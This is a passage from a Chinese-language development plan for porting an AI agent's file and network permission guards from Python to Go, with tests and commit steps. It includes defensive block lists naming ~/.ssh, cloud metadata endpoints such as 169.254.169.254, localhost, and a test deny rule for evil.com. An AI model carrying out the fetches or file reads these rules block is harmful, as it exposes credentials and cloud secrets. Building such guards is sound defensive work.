	effective := NormalizePathGuardConfig(perms, workspaceRoot, trustedDirs)
	if !effective.Enabled {
		return nil
	}
	return &FileGuardChecker{effective: effective, permissionConfig: perms}
}

// Enabled 路径层是否启用（实现 security.FileGuardEvaluator）
func (c *FileGuardChecker) Enabled() bool { return c.effective.Enabled }

// Mode 判定模式（实现 security.FileGuardEvaluator）
func (c *FileGuardChecker) Mode() string { return c.effective.Mode }

// CollectAskAccesses 实现 security.FileGuardEvaluator，返回 []security.PathAction
func (c *FileGuardChecker) CollectAskAccesses(toolName string, toolArgs map[string]any) []security.PathAction {
	raw := c.collectAskAccessesInternal(toolName, toolArgs)
	out := make([]security.PathAction, 0, len(raw))
	for _, item := range raw {
		out = append(out, security.PathAction{Path: item.Path, Action: string(item.Action)})
	}
	return out
}

// init 注册工厂，让 security 包能构造本包判定器而不直接 import。
func init() {
	security.RegisterFileGuardFactory(func(permissions map[string]any, workspaceRoot string, trustedDirs []string) security.FileGuardEvaluator {
		checker := BuildFileGuardChecker(permissions, workspaceRoot, trustedDirs)
		if checker == nil {
			return nil
		}
		return checker
	})
}

// 编译期断言：*FileGuardChecker 满足 security.FileGuardEvaluator
var _ security.FileGuardEvaluator = (*FileGuardChecker)(nil)
```

- [ ] **Step 8: 运行测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -v 2>&1 | tail -30
```

Expected: 全部 PASS。

- [ ] **Step 9: 抄 Python 测试做对拍**

```bash
ls /home/opensource/agent-core/tests/unit_tests/harness/security/ | grep -i "file_guard\|path_guard"
```

逐个文件把断言翻译为 Go 用例。**这是对齐验证的主要手段，不可省略。**

- [ ] **Step 10: 覆盖率 + 提交**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/agentcore/harness/security/fileguard/
gofmt -l internal/agentcore/harness/security/fileguard/
git add internal/agentcore/harness/security/fileguard/file_guard.go \
        internal/agentcore/harness/security/fileguard/file_guard_test.go
git commit -m "feat(fileguard): 配置编译与路径判定（file_guard.py 870 行）

37 个符号对齐，含双模式（legacy/native）、三轴（read/write/exec）、
两种匹配（prefix/glob）、五条 native 判定规则。

三处易错点按 spec §3.4 标注处理：
- external_paths 空列表返回 nil 而非空切片（下游对 None 与 [] 处理不同）
- prefix 判定两层：startswith + containsPath（后者处理 Windows 盘符）
- best_prefix 取最长前缀，不是首个匹配

init 注册 security.FileGuardFactory，避免 security ↔ fileguard 成环。"
git show --stat HEAD
```

---

## Task 7：`security/fileguard/sensitive_paths.go`

**Files:**
- Create: `internal/agentcore/harness/security/fileguard/sensitive_paths.go`
- Create: `internal/agentcore/harness/security/fileguard/sensitive_paths_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/sensitive_paths.py`（193 行）

- [ ] **Step 1: 写失败测试**

```go
// TestLoadPackageSensitivePaths_17条 测试包内敏感路径全部加载且带固定字段
func TestLoadPackageSensitivePaths_17条(t *testing.T) {
	paths := LoadPackageSensitivePaths()
	if len(paths) != 17 {
		t.Fatalf("条数 = %d, want 17", len(paths))
	}
	for _, p := range paths {
		if p["layer"] != "builtin" {
			t.Errorf("%v: layer = %v, want builtin", p["id"], p["layer"])
		}
		for _, axis := range []string{"read", "write", "exec"} {
			if p[axis] == nil {
				t.Errorf("%v: 缺 %s 轴", p["id"], axis)
			}
		}
		if p["match"] == nil {
			t.Errorf("%v: 缺 match", p["id"])
		}
	}
}

// TestLoadPackageSensitivePaths_home展开 测试 ~ 前缀被展开为绝对路径
func TestLoadPackageSensitivePaths_home展开(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Skip("无法取 home 目录")
	}
	for _, p := range LoadPackageSensitivePaths() {
		path, _ := p["path"].(string)
		if strings.Contains(path, "~") {
			t.Errorf("%v: path 未展开 ~: %q", p["id"], path)
		}
	}
	// home_ssh 应展开为 <home>/.ssh/**
	found := false
	for _, p := range LoadPackageSensitivePaths() {
		if p["id"] == "home_ssh" {
			found = true
			want := filepath.ToSlash(filepath.Join(home, ".ssh")) + "/**"
			if p["path"] != want {
				t.Errorf("home_ssh path = %v, want %v", p["path"], want)
			}
		}
	}
	if !found {
		t.Error("缺 home_ssh 条目")
	}
}

// TestMergePackageSensitivePaths_取严 测试 overlay 的 allow 被 floor 的 deny 覆盖
func TestMergePackageSensitivePaths_取严(t *testing.T) {
	perms := map[string]any{
		"file_guard": map[string]any{
			"enabled": true,
			"paths": []any{
				map[string]any{
					"path": "~/.ssh/**", "match": "glob",
					"read": "allow", "write": "allow", "exec": "allow",
				},
			},
		},
	}
	merged := MergePackageSensitivePaths(perms, nil)
	fg, _ := merged["file_guard"].(map[string]any)
	paths, _ := fg["paths"].([]any)

	var sshRule map[string]any
	for _, item := range paths {
		m, _ := item.(map[string]any)
		if p, _ := m["path"].(string); strings.HasSuffix(p, ".ssh/**") && !strings.Contains(p, "**/.ssh") {
			sshRule = m
			break
		}
	}
	if sshRule == nil {
		t.Fatal("未找到 ~/.ssh/** 规则")
	}
	if sshRule["read"] != "deny" {
		t.Errorf("read = %v, want deny（内置 floor 优先于 overlay 的 allow）", sshRule["read"])
	}
	if sshRule["layer"] != "builtin" {
		t.Errorf("layer = %v, want builtin", sshRule["layer"])
	}
}

// TestMergePackageSensitivePaths_开关关闭 测试 package_builtin_rules=false 时不注入
func TestMergePackageSensitivePaths_开关关闭(t *testing.T) {
	perms := map[string]any{
		"package_builtin_rules": false,
		"file_guard":            map[string]any{"enabled": true},
	}
	merged := MergePackageSensitivePaths(perms, nil)
	fg, _ := merged["file_guard"].(map[string]any)
	if paths, _ := fg["paths"].([]any); len(paths) != 0 {
		t.Errorf("开关关闭时仍注入了 %d 条", len(paths))
	}
}

// TestMergePackageSensitivePaths_未启用不注入 测试 file_guard 未启用时不注入
func TestMergePackageSensitivePaths_未启用不注入(t *testing.T) {
	perms := map[string]any{"file_guard": map[string]any{"enabled": false}}
	merged := MergePackageSensitivePaths(perms, nil)
	fg, _ := merged["file_guard"].(map[string]any)
	if paths, _ := fg["paths"].([]any); len(paths) != 0 {
		t.Errorf("未启用时仍注入了 %d 条", len(paths))
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -run TestLoadPackageSensitivePaths 2>&1 | head
```

Expected: `undefined: LoadPackageSensitivePaths`。

- [ ] **Step 3: 实现 `sensitive_paths.go`**

按 spec §3.5 实现。关键点：

- `loadPackageSensitivePaths` 从 `resources.ParseBuiltinRulesFromFile` 读 `SensitivePaths`
- 每条补 `read`/`write`/`exec` 三轴（都等于 `action`）、`layer="builtin"`、`match`（默认 `"glob"`）
- `path` 里的 `~` 用 `expandHomePath` 展开
- `action == "allow"` 的条目 **WARN 后跳过**（内置不允许 allow）
- `mergePackageSensitivePaths`：同 path 取严（overlay 的 `allow` 被 floor 的非 allow 覆盖），packaged 独有的追加到末尾

- [ ] **Step 4: 运行测试**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -v 2>&1 | tail -25
```

Expected: 全部 PASS。

- [ ] **Step 5: 提交**

```bash
gofmt -l internal/agentcore/harness/security/fileguard/
git add internal/agentcore/harness/security/fileguard/sensitive_paths.go \
        internal/agentcore/harness/security/fileguard/sensitive_paths_test.go
git commit -m "feat(fileguard): 包内敏感路径底线注入（sensitive_paths.py 193 行）

17 条内置敏感路径从 builtin_rules.yaml 的 sensitive_paths 段加载，
补 read/write/exec 三轴与 layer=builtin。与调用方 overlay 同 path 时
取严：overlay 的 allow 会被 floor 的 deny/ask 覆盖。

action=allow 的条目 WARN 后跳过——内置规则不允许放宽。"
git show --stat HEAD
```

---

## Task 8：`security/netguard/`

**Files:**
- Create: `internal/agentcore/harness/security/netguard/doc.go`
- Create: `internal/agentcore/harness/security/netguard/net_guard.go`
- Create: `internal/agentcore/harness/security/netguard/net_guard_test.go`
- Create: `internal/agentcore/harness/security/netguard/net_urls.go`
- Create: `internal/agentcore/harness/security/netguard/net_urls_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/netguard/`

- [ ] **Step 1: 写失败测试——`NetGuardChecker.evaluate`**

```go
package netguard

import (
	"testing"

	"github.com/uapclaw/uapclaw-go/internal/agentcore/harness/security"
)

// TestNetGuardChecker_黑名单命中 测试 URL 命中 deny 规则
func TestNetGuardChecker_黑名单命中(t *testing.T) {
	checker := BuildNetGuardChecker(map[string]any{
		"net_guard": map[string]any{
			"enabled": true,
			"urls":    map[string]any{"evil.com": "deny"},
		},
	})
	if checker == nil {
		t.Fatal("checker 为 nil")
	}
	result := checker.Evaluate("mcp_fetch_webpage", map[string]any{"url": "https://evil.com/x"})
	if result == nil {
		t.Fatal("未命中")
	}
	if result.Permission != security.PermissionLevelDeny {
		t.Errorf("Permission = %v, want DENY", result.Permission)
	}
	if !strings.Contains(result.MatchedRule, "net_guard:url:evil.com") {
		t.Errorf("MatchedRule = %q, want 含 net_guard:url:evil.com", result.MatchedRule)
	}
}

// TestNetGuardChecker_defaults為deny 测试无规则命中但 defaults=deny 时拒绝
func TestNetGuardChecker_defaults為deny(t *testing.T) {
	checker := BuildNetGuardChecker(map[string]any{
		"net_guard": map[string]any{
			"enabled":  true,
			"defaults": "deny",
			"urls":     map[string]any{},
		},
	})
	result := checker.Evaluate("mcp_fetch_webpage", map[string]any{"url": "https://other.com"})
	if result == nil || result.Permission != security.PermissionLevelDeny {
		t.Fatalf("result = %+v, want DENY（defaults=deny）", result)
	}
	if result.MatchedRule != "net_guard:defaults" {
		t.Errorf("MatchedRule = %q, want net_guard:defaults", result.MatchedRule)
	}
}

// TestNetGuardChecker_allow命中不返回 测试 allow 命中返回 nil（不抬升 A 段）
func TestNetGuardChecker_allow命中不返回(t *testing.T) {
	checker := BuildNetGuardChecker(map[string]any{
		"net_guard": map[string]any{
			"enabled": true,
			"urls":    map[string]any{"good.com": "allow"},
		},
	})
	if got := checker.Evaluate("mcp_fetch_webpage", map[string]any{"url": "https://good.com/x"}); got != nil {
		t.Errorf("allow 命中应返回 nil，got %+v", got)
	}
}

// TestNetGuardChecker_非fetch工具跳过 测试非 fetch 工具返回 nil
func TestNetGuardChecker_非fetch工具跳过(t *testing.T) {
	checker := BuildNetGuardChecker(map[string]any{
		"net_guard": map[string]any{"enabled": true, "urls": map[string]any{"*": "deny"}},
	})
	if got := checker.Evaluate("read_file", map[string]any{"file_path": "/x"}); got != nil {
		t.Errorf("非 fetch 工具应返回 nil，got %+v", got)
	}
}

// TestNetGuardChecker_未启用返回nil 测试 enabled=false 时构造返回 nil
func TestNetGuardChecker_未启用返回nil(t *testing.T) {
	if checker := BuildNetGuardChecker(map[string]any{"net_guard": map[string]any{"enabled": false}}); checker != nil {
		t.Error("enabled=false 时 BuildNetGuardChecker 应返回 nil")
	}
	if checker := BuildNetGuardChecker(map[string]any{}); checker != nil {
		t.Error("无 net_guard 段时 BuildNetGuardChecker 应返回 nil")
	}
}

// TestExtractFetchURL_键顺序 测试六个 URL 参数键按顺序取第一个非空
func TestExtractFetchURL_键顺序(t *testing.T) {
	got := ExtractFetchURL(map[string]any{"target_url": "https://a.com", "url": "https://b.com"})
	if got != "https://b.com" {
		t.Errorf("ExtractFetchURL = %q, want https://b.com（url 优先于 target_url）", got)
	}
	got = ExtractFetchURL(map[string]any{"page_url": "https://c.com"})
	if got != "https://c.com" {
		t.Errorf("ExtractFetchURL = %q, want https://c.com", got)
	}
	if got = ExtractFetchURL(map[string]any{}); got != "" {
		t.Errorf("空 args 应返回空串，got %q", got)
	}
}

// TestMatchNetPattern_通配符 测试域名通配符与完整 URL glob
func TestMatchNetPattern_通配符(t *testing.T) {
	cases := []struct {
		pattern, url string
		want         bool
	}{
		{"*.evil.com", "https://a.evil.com/x", true},
		{"evil.com", "https://evil.com/x", true},
		{"evil.com", "https://sub.evil.com/x", false},
		{"https://evil.com/*", "https://evil.com/a", true},
		{"https://evil.com/*", "https://other.com/a", false},
		{"", "https://x.com", false},
	}
	for _, c := range cases {
		if got := MatchNetPattern(c.pattern, c.url); got != c.want {
			t.Errorf("MatchNetPattern(%q, %q) = %v, want %v", c.pattern, c.url, got, c.want)
		}
	}
}

// TestLoadPackageNetURLs_四条 测试包内 net_urls 加载
func TestLoadPackageNetURLs_四条(t *testing.T) {
	urls := LoadPackageNetURLs()
	if len(urls) != 4 {
		t.Fatalf("条数 = %d, want 4", len(urls))
	}
	for _, k := range []string{"169.254.169.254", "metadata.google.internal", "localhost", "127.0.0.1"} {
		if urls[k] != "deny" {
			t.Errorf("urls[%q] = %q, want deny", k, urls[k])
		}
	}
}

// TestMergePackageNetURLs_内置deny不可放宽 测试 overlay 的 allow 被内置 deny 覆盖
func TestMergePackageNetURLs_内置deny不可放宽(t *testing.T) {
	perms := map[string]any{
		"net_guard": map[string]any{
			"enabled": true,
			"urls":    map[string]any{"169.254.169.254": "allow"},
		},
	}
	merged := MergePackageNetURLs(perms, nil)
	ng, _ := merged["net_guard"].(map[string]any)
	urls, _ := ng["urls"].(map[string]any)
	if urls["169.254.169.254"] != "deny" {
		t.Errorf("169.254.169.254 = %v, want deny（内置 floor 优先）", urls["169.254.169.254"])
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/netguard/ 2>&1 | head
```

Expected: `undefined: BuildNetGuardChecker`。

- [ ] **Step 3: 实现 `net_guard.go`**

按 spec §3.6 实现。**注意 `net_guard.py` 与 `net_urls.py` 各有一份 `_parse_action`，两份独立实现，不共用**（对齐 Python 的重复写法）。

- [ ] **Step 4: 实现 `net_urls.go`**

关键语义：

- `LoadPackageNetURLs` 读 `resources` 的 `NetUrls` 字段，`_parse_action` 支持 `"deny"` 字符串与 `{"action":...}` / `{"fetch":...}` 包装
- `hasPackageNetURLs(urls)`：**packaged 的所有键都在 urls 里**才算已有（`set.issubset`），空 packaged 返回 false
- `MergePackageNetURLs`：overlay=`allow` + floor=`deny` → 用 `deny`；overlay 缺失 → 用 floor；其他 → `_stricter`

- [ ] **Step 5: 实现 `init` 注册 + doc.go**

```go
func init() {
	security.RegisterNetGuardFactory(func(permissions map[string]any) security.NetGuardEvaluator {
		checker := BuildNetGuardChecker(permissions)
		if checker == nil {
			return nil
		}
		return checker
	})
}

var _ security.NetGuardEvaluator = (*NetGuardChecker)(nil)
```

- [ ] **Step 6: 运行测试 + 覆盖率**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/agentcore/harness/security/netguard/ -v 2>&1 | tail -25
```

Expected: 全部 PASS，覆盖率 ≥ 85%。

- [ ] **Step 7: 提交**

```bash
gofmt -l internal/agentcore/harness/security/netguard/
git add internal/agentcore/harness/security/netguard/
git commit -m "feat(netguard): fetch 工具网络防护（Pipeline C，315 行）

net_guard.py + net_urls.py 对齐。只有 allow/deny，无 ask。仅对
mcp_fetch_webpage / fetch_webpage / web_fetch_webpage 生效。

net_guard.py 与 net_urls.py 各有一份 _parse_action，Python 侧本就重复
两次实现，Go 保持两份独立，不合并。

内置 4 条黑名单（169.254.169.254 / metadata.google.internal /
localhost / 127.0.0.1）不可被 overlay 放宽为 allow。"
git show --stat HEAD
```

---

## Task 9：`security/permission_engine.go` 重写为 A/B/C 三段

**Files:**
- Modify: `internal/agentcore/harness/security/permission_engine.go`（全文重写）
- Modify: `internal/agentcore/harness/security/models.go`（ToolPermissionHost 加字段）
- Create: `internal/agentcore/harness/security/fileguard_evaluator.go`（接口 + 工厂变量）
- Delete: `internal/agentcore/harness/security/checker.go`
- Delete: `internal/agentcore/harness/security/checker_test.go`
- Modify: `internal/agentcore/harness/security/permission_engine_test.go`

- [ ] **Step 1: 写失败测试——B 段与 C 段生效**

```go
// TestCheckPermission_B段路径防护 测试外部路径访问被 B 段抬到 ASK
func TestCheckPermission_B段路径防护(t *testing.T) {
	workspace := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret.txt")

	engine := NewPermissionEngine(
		map[string]any{"file_guard": map[string]any{"enabled": true}},
		nil, "", workspace,
	)
	// 触发 fileguard 工厂注册
	registerTestGuards(t)

	result := engine.CheckPermission(context.Background(), "read_file",
		map[string]any{"file_path": outside})
	if result.Permission != PermissionLevelAsk && result.Permission != PermissionLevelDeny {
		t.Errorf("Permission = %v, want ASK 或 DENY（外部路径）", result.Permission)
	}
	if len(result.ExternalPaths) == 0 {
		t.Error("ExternalPaths 为空，B 段未生效")
	}
}

// TestCheckPermission_C段网络防护 测试黑名单 URL 被 C 段拒绝
func TestCheckPermission_C段网络防护(t *testing.T) {
	engine := NewPermissionEngine(
		map[string]any{
			"net_guard": map[string]any{
				"enabled": true,
				"urls":    map[string]any{"evil.com": "deny"},
			},
		},
		nil, "", t.TempDir(),
	)
	registerTestGuards(t)

	result := engine.CheckPermission(context.Background(), "mcp_fetch_webpage",
		map[string]any{"url": "https://evil.com/x"})
	if result.Permission != PermissionLevelDeny {
		t.Errorf("Permission = %v, want DENY", result.Permission)
	}
}

// TestCheckPermission_三段取最严 测试 A 段 allow + B 段 deny → deny
func TestCheckPermission_三段取最严(t *testing.T) {
	workspace := t.TempDir()
	outside := filepath.Join(t.TempDir(), "x.txt")
	engine := NewPermissionEngine(
		map[string]any{
			"tools":      map[string]any{"read_file": "allow"},
			"file_guard": map[string]any{"enabled": true, "defaults": map[string]any{"read": "deny"}},
		},
		nil, "", workspace,
	)
	registerTestGuards(t)

	result := engine.CheckPermission(context.Background(), "read_file",
		map[string]any{"file_path": outside})
	if result.Permission != PermissionLevelDeny {
		t.Errorf("Permission = %v, want DENY（B 段更严）", result.Permission)
	}
}

// TestCheckPermission_B段无意见时不改A段 测试内部路径读不抬升
func TestCheckPermission_B段无意见时不改A段(t *testing.T) {
	workspace := t.TempDir()
	inside := filepath.Join(workspace, "ok.txt")
	engine := NewPermissionEngine(
		map[string]any{"file_guard": map[string]any{"enabled": true}},
		nil, "", workspace,
	)
	registerTestGuards(t)

	result := engine.CheckPermission(context.Background(), "read_file",
		map[string]any{"file_path": inside})
	if result.Permission == PermissionLevelDeny {
		t.Errorf("Permission = %v, 内部路径不应被 DENY", result.Permission)
	}
}

// TestUpdateTrustedDirs 测试受信目录注入后外部路径不再 ASK
func TestUpdateTrustedDirs(t *testing.T) {
	workspace := t.TempDir()
	trusted := t.TempDir()
	target := filepath.Join(trusted, "a.txt")

	engine := NewPermissionEngine(
		map[string]any{"file_guard": map[string]any{"enabled": true}},
		nil, "", workspace,
	)
	registerTestGuards(t)

	before := engine.CheckPermission(context.Background(), "read_file", map[string]any{"file_path": target})
	engine.UpdateTrustedDirs([]string{trusted})
	after := engine.CheckPermission(context.Background(), "read_file", map[string]any{"file_path": target})

	if before.Permission == PermissionLevelAllow && after.Permission == PermissionLevelAllow {
		t.Skip("两态相同，本环境无法区分")
	}
	if after.Permission == PermissionLevelDeny {
		t.Errorf("加入 trusted_dirs 后仍 DENY（%s）", after.MatchedRule)
	}
	if got := engine.TrustedDirs(); len(got) != 1 || got[0] != trusted {
		t.Errorf("TrustedDirs() = %v, want [%s]", got, trusted)
	}
}

// TestSetWorkspaceRoot_已删除 编译期保证：本测试文件内不得出现 SetWorkspaceRoot 调用
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ -run 'TestCheckPermission_B段|TestCheckPermission_C段|TestUpdateTrustedDirs' 2>&1 | head -20
```

Expected: 编译失败或断言失败（B/C 段未接）。

- [ ] **Step 3: 新增 `fileguard_evaluator.go`（接口 + 工厂）**

```go
// Package security 提供 harness 权限安全基础设施。
// （package 注释在 doc.go，此处只放接口定义）
package security

// ──────────────────────────── 结构体 ────────────────────────────

// PathAction 一次需要落盘的路径访问（fileguard 的 AskAccess 在 security 侧的表示）。
type PathAction struct {
	// Path 绝对路径（posix 形式）
	Path string
	// Action 访问动作：read / write / exec
	Action string
}

// FileGuardEvaluator 路径防护判定器。
//
// 由 fileguard 子包实现，security 包只依赖此接口——避免 security ↔ fileguard
// 循环依赖（fileguard 需要 security 的 PermissionLevel / PathTools 等）。
// 判定语义见 fileguard.FileGuardChecker。
type FileGuardEvaluator interface {
	// Enabled 路径层是否启用
	Enabled() bool
	// Mode 判定模式（"legacy" / "native"）
	Mode() string
	// Evaluate 返回路径层判定结果；无意见或全 ALLOW 时返回 nil
	Evaluate(toolName string, toolArgs map[string]any) *PermissionResult
	// CollectAskAccesses 返回本次判定为 ASK 的访问，供「总是允许」按轴落盘
	CollectAskAccesses(toolName string, toolArgs map[string]any) []PathAction
}

// NetGuardEvaluator 网络防护判定器。由 netguard 子包实现，语义见
// netguard.NetGuardChecker。只有 allow/deny，无 ask。
type NetGuardEvaluator interface {
	Evaluate(toolName string, toolArgs map[string]any) *PermissionResult
}

// FileGuardFactory 构造路径防护判定器。路径层关闭时应返回 nil。
type FileGuardFactory func(permissions map[string]any, workspaceRoot string, trustedDirs []string) FileGuardEvaluator

// NetGuardFactory 构造网络防护判定器。网络层关闭时应返回 nil。
type NetGuardFactory func(permissions map[string]any) NetGuardEvaluator

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// fileGuardFactoryMu 工厂注册锁
	fileGuardFactoryMu sync.RWMutex
	// fileGuardFactory 路径防护工厂，由 fileguard 子包 init 注入
	fileGuardFactory FileGuardFactory
	// netGuardFactoryMu 工厂注册锁
	netGuardFactoryMu sync.RWMutex
	// netGuardFactory 网络防护工厂，由 netguard 子包 init 注入
	netGuardFactory NetGuardFactory
)

// ──────────────────────────── 导出函数 ────────────────────────────

// RegisterFileGuardFactory 注册路径防护判定器工厂。仅供 fileguard 子包 init 调用。
func RegisterFileGuardFactory(f FileGuardFactory) {
	fileGuardFactoryMu.Lock()
	fileGuardFactory = f
	fileGuardFactoryMu.Unlock()
}

// RegisterNetGuardFactory 注册网络防护判定器工厂。仅供 netguard 子包 init 调用。
func RegisterNetGuardFactory(f NetGuardFactory) {
	netGuardFactoryMu.Lock()
	netGuardFactory = f
	netGuardFactoryMu.Unlock()
}

// NewFileGuardEvaluator 构造路径防护判定器。未注册工厂或路径层关闭时返回 nil。
//
// 供 rails 侧在 persist 链路构造判定器使用——那里要用「刚合并的配置」而非
// 引擎当前配置，故不能走引擎的 fileGuard 字段。
func NewFileGuardEvaluator(permissions map[string]any, workspaceRoot string, trustedDirs []string) FileGuardEvaluator {
	return newFileGuardEvaluator(permissions, workspaceRoot, trustedDirs)
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// newFileGuardEvaluator 用已注册的工厂构造判定器，未注册返回 nil。
func newFileGuardEvaluator(permissions map[string]any, workspaceRoot string, trustedDirs []string) FileGuardEvaluator {
	fileGuardFactoryMu.RLock()
	f := fileGuardFactory
	fileGuardFactoryMu.RUnlock()
	if f == nil {
		return nil
	}
	return f(permissions, workspaceRoot, trustedDirs)
}

// newNetGuardEvaluator 用已注册的工厂构造判定器，未注册返回 nil。
func newNetGuardEvaluator(permissions map[string]any) NetGuardEvaluator {
	netGuardFactoryMu.RLock()
	f := netGuardFactory
	netGuardFactoryMu.RUnlock()
	if f == nil {
		return nil
	}
	return f(permissions)
}
```

- [ ] **Step 4: 重写 `permission_engine.go`**

完整重写（保留原有 `UpdateConfig` / `UpdateLLM` / `Enabled` / `SetPermissionChecksActive` / `SetSceneHook` / `CheckToolPermissionDirectly` / `Config` / `getReason`，改 `NewPermissionEngine` / `CheckPermission` / `EvaluateGlobalPolicyDirectly`，删 `SetWorkspaceRoot`）：

```go
// PermissionEngine 权限引擎 — 负责加载配置、评估权限。
//
// 判定管线（对齐 Python core.py check_permission）：
//
//	Pipeline A：evaluate_tiered_policy（工具级 + 参数规则 + defaults）
//	Pipeline B：file_guard（路径防护；含 ExternalDirectory Legacy 投影）
//	Pipeline C：net_guard（fetch 工具 URL 白黑名单；只有 allow/deny）
//	→ strictest(A, B, C)
//
// Python: PermissionEngine (core.py)
type PermissionEngine struct {
	mu sync.RWMutex
	// config 权限配置（运行时可变 dict）
	config map[string]any
	// enabled 是否启用
	enabled bool
	// permissionChecksActive 权限校验是否活跃
	permissionChecksActive func() bool
	// workspaceRoot 工作空间根目录（仅构造时设定，对齐 Python _workspace_root）
	workspaceRoot string
	// trustedDirs 受信目录（请求级热更新，对齐 Python _trusted_dirs）
	trustedDirs []string
	// fileGuard 路径防护判定器
	fileGuard FileGuardEvaluator
	// netGuard 网络防护判定器
	netGuard NetGuardEvaluator
	// llm 保留字段（对齐 Python _llm，供 PermissionInterruptRail 等热更新模型）
	llm *llm.Model
	// modelName 保留字段（对齐 Python _model_name）
	modelName string
	// sceneHook 宿主场景钩子（对齐 Python PermissionSceneHook）
	sceneHook PermissionSceneHookFn
}

// NewPermissionEngine 创建权限引擎。
//
// Python: PermissionEngine.__init__(config, llm, model_name, workspace_root, trusted_dirs)
func NewPermissionEngine(config map[string]any, llmModel *llm.Model, modelName string, workspaceRoot string) *PermissionEngine {
	prepared := PreparePermissionsForEngine(config)
	enabled := true
	if v, ok := prepared["enabled"]; ok {
		if b, isBool := v.(bool); isBool {
			enabled = b
		}
	}
	e := &PermissionEngine{
		config:        prepared,
		enabled:       enabled,
		workspaceRoot: workspaceRoot,
		llm:           llmModel,
		modelName:     modelName,
	}
	e.rebuildGuards()
	return e
}

// PreparePermissionsForEngine 在配置进入引擎前注入内置规则。
//
// 四步（对齐 Python prepare_permissions_for_engine）：
//  1. package_builtin_rules 关闭 → 只补 legacy action，全跳过
//  2. rules 无 builtin 层 → 注入命令规则
//  3. file_guard.enabled 且 paths 无 builtin 层 → 注入敏感路径
//  4. net_guard.enabled 且 urls 未含全部内置 → 注入 net_urls
//
// Python: prepare_permissions_for_engine(config)
func PreparePermissionsForEngine(config map[string]any) map[string]any {
	cfg := utils.DeepCopyMap(config)
	if cfg == nil {
		cfg = map[string]any{}
	}

	if !toolguard.PackageBuiltinRulesEnabled(cfg) {
		return fillLegacyHostRuleActions(cfg)
	}

	if !hasBuiltinLayer(cfg["rules"]) {
		cfg = toolguard.InlinePackageCommandRules(cfg)
	}
	if fg := mapAnyOrNil(cfg["file_guard"]); fg != nil && truthy(fg["enabled"]) {
		if !hasBuiltinLayer(fg["paths"]) {
			cfg = fileguardBridge.MergePackageSensitivePaths(cfg, nil)
		}
	}
	if ng := mapAnyOrNil(cfg["net_guard"]); ng != nil && truthy(ng["enabled"]) {
		if !fileguardBridge.HasPackageNetURLs(ng["urls"]) {
			cfg = fileguardBridge.MergePackageNetURLs(cfg, nil)
		}
	}
	return fillLegacyHostRuleActions(cfg)
}
```

> 🔴 **`fileguardBridge` 又是个循环依赖问题**：`PreparePermissionsForEngine` 在 `security` 包，要调 `fileguard.MergePackageSensitivePaths` 和 `netguard.MergePackageNetURLs`。
>
> **解法**：按 Step 3 同样模式，加三个函数类型 + 三个包级变量，由子包 `init` 注册。把下面这段加到 `fileguard_evaluator.go`：

```go
// ──────────────────────────── 结构体 ────────────────────────────

// SensitivePathsMerger 把包内敏感路径注入配置的 file_guard.paths。
type SensitivePathsMerger func(permissions map[string]any, inject *bool) map[string]any

// NetURLsMerger 把包内 net_urls 注入配置的 net_guard.urls。
type NetURLsMerger func(permissions map[string]any, inject *bool) map[string]any

// HasPackageNetURLsFunc 判定配置的 urls 是否已含全部包内内置项。
type HasPackageNetURLsFunc func(urls any) bool

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// bridgeMu 三个注入函数注册锁
	bridgeMu sync.RWMutex
	// sensitivePathsMerger 敏感路径注入函数
	sensitivePathsMerger SensitivePathsMerger
	// netURLsMerger net_urls 注入函数
	netURLsMerger NetURLsMerger
	// hasPackageNetURLs 内置 net_urls 存在性判定
	hasPackageNetURLs HasPackageNetURLsFunc
)

// ──────────────────────────── 导出函数 ────────────────────────────

// RegisterPermissionBridges 注册三个配置注入函数。仅供 fileguard / netguard
// 子包 init 调用。
func RegisterPermissionBridges(
	sensitiveMerger SensitivePathsMerger,
	netMerger NetURLsMerger,
	hasNetURLs HasPackageNetURLsFunc,
) {
	bridgeMu.Lock()
	defer bridgeMu.Unlock()
	if sensitiveMerger != nil {
		sensitivePathsMerger = sensitiveMerger
	}
	if netMerger != nil {
		netURLsMerger = netMerger
	}
	if hasNetURLs != nil {
		hasPackageNetURLs = hasNetURLs
	}
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// applySensitivePaths 注入内置敏感路径。注册函数缺失时原样返回并 WARN。
func applySensitivePaths(cfg map[string]any) map[string]any {
	bridgeMu.RLock()
	f := sensitivePathsMerger
	bridgeMu.RUnlock()
	if f == nil {
		logger.Warn(logComponent).Msg("permission.prepare.sensitive_paths_merger_missing")
		return cfg
	}
	return f(cfg, nil)
}

// applyNetURLs 注入内置 net_urls。注册函数缺失时原样返回并 WARN。
func applyNetURLs(cfg map[string]any) map[string]any {
	bridgeMu.RLock()
	f := netURLsMerger
	bridgeMu.RUnlock()
	if f == nil {
		logger.Warn(logComponent).Msg("permission.prepare.net_urls_merger_missing")
		return cfg
	}
	return f(cfg, nil)
}

// hasPackageNetURLsIn 判定 urls 是否已含全部包内内置项。注册函数缺失时
// 返回 false（保守：触发注入，即使已存在也只是重复覆盖成相同值）。
func hasPackageNetURLsIn(urls any) bool {
	bridgeMu.RLock()
	f := hasPackageNetURLs
	bridgeMu.RUnlock()
	if f == nil {
		return false
	}
	return f(urls)
}
```

然后在 `fileguard` 的 `init` 里补一行（与工厂注册同一个 init）：

```go
func init() {
	security.RegisterFileGuardFactory(func(permissions map[string]any, workspaceRoot string, trustedDirs []string) security.FileGuardEvaluator {
